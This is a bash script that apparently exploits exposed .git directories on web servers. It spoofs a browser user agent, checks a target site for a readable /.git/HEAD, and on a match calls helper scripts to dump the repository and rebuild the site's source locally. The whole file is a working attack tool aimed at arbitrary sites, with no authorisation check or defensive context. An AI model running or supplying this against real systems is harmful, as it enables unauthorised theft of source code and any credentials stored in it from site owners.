#!/bin/bash
CURL_HEADER="Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
NO_HTTP=false
# Testing the server..
function ping_server () {
	ping -c 1 $(echo $1 | sed -e "s_https://__g" \
		-e "s_http://__g" \
		-e "s_www.__g") > /dev/null 2>&1
	if [ "$?" != "0" ]; then
		ping -c 1 $(echo $1 | sed -e "s_https://__g" \
                	-e "s_http://__g") > /dev/null 2>&1
		if [ "$?" != "0" ]; then
			echo Invalid site
			exit 1
		fi
	fi
}
# Test the exploit
function test_exploit () {
	OUTPUT=$(curl -A "$CURL_HEADER" -fks "$1/.git/HEAD")	
	if [ "$OUTPUT" = "ref: refs/heads/master" ]; then
		echo Exploit detected
	else
		echo Site is safe
		exit 1
	fi
}
if [ ! "$1" ] || [ "$1" = "--help" ]; then
	echo sh $0 [site] [dir]
	exit
fi
URL=$1
DIR=$2
if [[ $URL = *https* ]] || [[ $URL = *http* ]] || [[ $URL = *www* ]]; then
	NO_HTTP=true
fi
if [ "$NO_HTTP" = "false" ]; then
	URL="http://www.$URL"	
fi
ping_server "$URL"
test_exploit "$URL"
bash ./tools/gitdumper.sh "$URL/.git/" "$DIR"
bash ./tools/extractor.sh "$DIR" "$DIR"
